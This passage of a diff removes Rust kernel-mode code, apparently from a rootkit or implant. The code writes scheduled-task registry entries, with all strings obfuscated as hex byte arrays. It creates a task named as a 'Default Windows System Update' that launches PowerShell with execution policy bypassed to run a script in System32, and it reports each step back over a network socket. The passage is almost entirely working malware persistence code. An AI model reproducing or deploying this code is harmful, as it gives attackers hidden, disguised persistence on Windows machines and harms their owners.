-                        ((*reg_funcs).ex_free_pool_with_tag)(author_value as _, 74);
-                        */
-                        let description_raw = [0x44u8, 0x65u8, 0x73u8, 0x63u8, 0x72u8, 0x69u8, 0x70u8, 0x74u8, 0x69u8, 0x6fu8, 0x6eu8, 0x00u8];
-                        let description: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 26) as _;
-                        ntdef::macros::RtlZeroMemory(description as _, 26);
-                        ntdef::macros::RtlCopyMemory(description, &description_raw as _, 12);
-
-                        let description_value_raw = [0x44u8, 0x65u8, 0x66u8, 0x61u8, 0x75u8, 0x6cu8, 0x74u8, 0x20u8, 0x57u8, 0x69u8, 0x6eu8, 0x64u8, 0x6fu8, 0x77u8, 0x73u8, 0x20u8, 0x53u8, 0x79u8, 0x73u8, 0x74u8, 0x65u8, 0x6du8, 0x20u8, 0x55u8, 0x70u8, 0x64u8, 0x61u8, 0x74u8, 0x65u8, 0x00u8];
-                        let description_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 62) as _;
-                        ntdef::macros::RtlZeroMemory(description_value as _, 62);
-                        ntdef::macros::RtlCopyMemory(description_value, &description_value_raw as _, 30);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, description, 26, ntdef::enums::REG_SZ, description_value as _, 62
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(description as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(description_value as _, 74);
-
-                        let uri_raw = [0x55u8, 0x52u8, 0x49u8, 0x00u8];
-                        let uri: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 10) as _;
-                        ntdef::macros::RtlZeroMemory(uri as _, 10);
-                        ntdef::macros::RtlCopyMemory(uri, &uri_raw as _, 4);
-
-                        let uri_value_raw = [0x5cu8, 0x44u8, 0x65u8, 0x66u8, 0x61u8, 0x75u8, 0x6cu8, 0x74u8, 0x55u8, 0x70u8, 0x64u8, 0x61u8, 0x74u8, 0x65u8, 0x00u8];
-                        let uri_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 32) as _;
-                        ntdef::macros::RtlZeroMemory(uri_value as _, 32);
-                        ntdef::macros::RtlCopyMemory(uri_value, &uri_value_raw as _, 15);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, uri, 10, ntdef::enums::REG_SZ, uri_value as _, 32
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(uri as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(uri_value as _, 74);
-
-                        let triggers_raw = [0x54u8, 0x72u8, 0x69u8, 0x67u8, 0x67u8, 0x65u8, 0x72u8, 0x73u8, 0x00u8];
-                        let triggers: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 20) as _;
-                        ntdef::macros::RtlZeroMemory(triggers as _, 20);
-                        ntdef::macros::RtlCopyMemory(triggers, &triggers_raw as _, 9);
-
-                        let triggers_value_raw = [0x17u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xe0u8, 0x97u8, 0x09u8, 0xaau8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xe0u8, 0x97u8, 0x09u8, 0xaau8, 0x00u8, 0x00u8, 0x00u8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0x68u8, 0x21u8, 0x42u8, 0x43u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x81u8, 0x35u8, 0x56u8, 0x56u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x0eu8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x41u8, 0x00u8, 0x75u8, 0x00u8, 0x74u8, 0x00u8, 0x68u8, 0x00u8, 0x6fu8, 0x00u8, 0x72u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x05u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x0cu8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x01u8, 0x01u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x12u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x2cu8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0x80u8, 0xf4u8, 0x03u8, 0x00u8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0x04u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8, 0x88u8, 0x88u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xe0u8, 0x97u8, 0x09u8, 0xaau8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xe0u8, 0x97u8, 0x09u8, 0xaau8, 0x00u8, 0x00u8, 0x00u8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x01u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x48u8, 0x48u8, 0x48u8, 0x48u8];
-                        let triggers_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 288) as _;
-                        ntdef::macros::RtlCopyMemory(triggers_value, &triggers_value_raw as _, 288);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, triggers, 20, ntdef::enums::REG_BINARY, triggers_value as _, 288
-                        );
-
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(triggers as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(triggers_value as _, 74);
-
-                        let actions_raw = [0x41u8, 0x63u8, 0x74u8, 0x69u8, 0x6fu8, 0x6eu8, 0x73u8, 0x00u8];
-                        let actions: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 20) as _;
-                        ntdef::macros::RtlZeroMemory(actions as _, 20);
-                        ntdef::macros::RtlCopyMemory(actions, &actions_raw as _, 8);
-
-                        let actions_value_raw = [0x03u8, 0x00u8, 0x0cu8, 0x00u8, 0x00u8, 0x00u8, 0x41u8, 0x00u8, 0x75u8, 0x00u8, 0x74u8, 0x00u8, 0x68u8, 0x00u8, 0x6fu8, 0x00u8, 0x72u8, 0x00u8, 0x66u8, 0x66u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x72u8, 0x00u8, 0x00u8, 0x00u8, 0x43u8, 0x00u8, 0x3au8, 0x00u8, 0x5cu8, 0x00u8, 0x57u8, 0x00u8, 0x69u8, 0x00u8, 0x6eu8, 0x00u8, 0x64u8, 0x00u8, 0x6fu8, 0x00u8, 0x77u8, 0x00u8, 0x73u8, 0x00u8, 0x5cu8, 0x00u8, 0x53u8, 0x00u8, 0x79u8, 0x00u8, 0x73u8, 0x00u8, 0x74u8, 0x00u8, 0x65u8, 0x00u8, 0x6du8, 0x00u8, 0x33u8, 0x00u8, 0x32u8, 0x00u8, 0x5cu8, 0x00u8, 0x57u8, 0x00u8, 0x69u8, 0x00u8, 0x6eu8, 0x00u8, 0x64u8, 0x00u8, 0x6fu8, 0x00u8, 0x77u8, 0x00u8, 0x73u8, 0x00u8, 0x50u8, 0x00u8, 0x6fu8, 0x00u8, 0x77u8, 0x00u8, 0x65u8, 0x00u8, 0x72u8, 0x00u8, 0x53u8, 0x00u8, 0x68u8, 0x00u8, 0x65u8, 0x00u8, 0x6cu8, 0x00u8, 0x6cu8, 0x00u8, 0x5cu8, 0x00u8, 0x76u8, 0x00u8, 0x31u8, 0x00u8, 0x2eu8, 0x00u8, 0x30u8, 0x00u8, 0x5cu8, 0x00u8, 0x70u8, 0x00u8, 0x6fu8, 0x00u8, 0x77u8, 0x00u8, 0x65u8, 0x00u8, 0x72u8, 0x00u8, 0x73u8, 0x00u8, 0x68u8, 0x00u8, 0x65u8, 0x00u8, 0x6cu8, 0x00u8, 0x6cu8, 0x00u8, 0x2eu8, 0x00u8, 0x65u8, 0x00u8, 0x78u8, 0x00u8, 0x65u8, 0x00u8, 0x8au8, 0x00u8, 0x00u8, 0x00u8, 0x2du8, 0x00u8, 0x45u8, 0x00u8, 0x78u8, 0x00u8, 0x65u8, 0x00u8, 0x63u8, 0x00u8, 0x75u8, 0x00u8, 0x74u8, 0x00u8, 0x69u8, 0x00u8, 0x6fu8, 0x00u8, 0x6eu8, 0x00u8, 0x50u8, 0x00u8, 0x6fu8, 0x00u8, 0x6cu8, 0x00u8, 0x69u8, 0x00u8, 0x63u8, 0x00u8, 0x79u8, 0x00u8, 0x20u8, 0x00u8, 0x42u8, 0x00u8, 0x79u8, 0x00u8, 0x70u8, 0x00u8, 0x61u8, 0x00u8, 0x73u8, 0x00u8, 0x73u8, 0x00u8, 0x20u8, 0x00u8, 0x2du8, 0x00u8, 0x43u8, 0x00u8, 0x6fu8, 0x00u8, 0x6du8, 0x00u8, 0x6du8, 0x00u8, 0x61u8, 0x00u8, 0x6eu8, 0x00u8, 0x64u8, 0x00u8, 0x20u8, 0x00u8, 0x22u8, 0x00u8, 0x26u8, 0x00u8, 0x20u8, 0x00u8, 0x27u8, 0x00u8, 0x43u8, 0x00u8, 0x3au8, 0x00u8, 0x5cu8, 0x00u8, 0x57u8, 0x00u8, 0x69u8, 0x00u8, 0x6eu8, 0x00u8, 0x64u8, 0x00u8, 0x6fu8, 0x00u8, 0x77u8, 0x00u8, 0x73u8, 0x00u8, 0x5cu8, 0x00u8, 0x53u8, 0x00u8, 0x79u8, 0x00u8, 0x73u8, 0x00u8, 0x74u8, 0x00u8, 0x65u8, 0x00u8, 0x6du8, 0x00u8, 0x33u8, 0x00u8, 0x32u8, 0x00u8, 0x5cu8, 0x00u8, 0x75u8, 0x00u8, 0x70u8, 0x00u8, 0x64u8, 0x00u8, 0x61u8, 0x00u8, 0x74u8, 0x00u8, 0x65u8, 0x00u8, 0x2eu8, 0x00u8, 0x70u8, 0x00u8, 0x73u8, 0x00u8, 0x31u8, 0x00u8, 0x27u8, 0x00u8, 0x22u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8];
-                        let actions_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 290) as _;
-                        ntdef::macros::RtlCopyMemory(actions_value, &actions_value_raw as _, 290);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, actions, 20, ntdef::enums::REG_BINARY, actions_value as _, 290
-                        );
-
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(actions as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(actions_value as _, 74);
-                        
-                        let dynamic_info_raw = [0x44u8, 0x79u8, 0x6eu8, 0x61u8, 0x6du8, 0x69u8, 0x63u8, 0x49u8, 0x6eu8, 0x66u8, 0x6fu8, 0x00u8];
-                        let dynamic_info: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 26) as _;
-                        ntdef::macros::RtlZeroMemory(dynamic_info as _, 26);
-                        ntdef::macros::RtlCopyMemory(dynamic_info, &dynamic_info_raw as _, 12);
-
-                        let dynamic_info_value_raw = [0x03u8, 0x00u8, 0x00u8, 0x00u8, 0x01u8, 0xe5u8, 0x41u8, 0x47u8, 0x13u8, 0xc2u8, 0xd8u8, 0x01u8, 0x2eu8, 0x93u8, 0x41u8, 0x5cu8, 0x13u8, 0xc2u8, 0xd8u8, 0x01u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x6au8, 0xceu8, 0x8bu8, 0x5eu8, 0x13u8, 0xc2u8, 0xd8u8, 0x01u8];
-                        let dynamic_info_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 36) as _;
-                        ntdef::macros::RtlCopyMemory(dynamic_info_value, &dynamic_info_value_raw as _, 36);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, dynamic_info, 26, ntdef::enums::REG_BINARY, dynamic_info_value as _, 36
-                        );
-
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(dynamic_info as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(dynamic_info_value as _, 74);
-                        
-                        ntreg::close_handle(reg_funcs, handle);
-                    } else {
-                        let key_create_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x63u8, 0x72u8, 0x65u8, 0x61u8, 0x74u8, 0x65u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                        let _ = socket.send(&key_create_error_msg as *const u8, 17);
-                    }
                 } else {
                     let key_create_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x63u8, 0x72u8, 0x65u8, 0x61u8, 0x74u8, 0x65u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                     let _ = socket.send(&key_create_error_msg as *const u8, 17);     
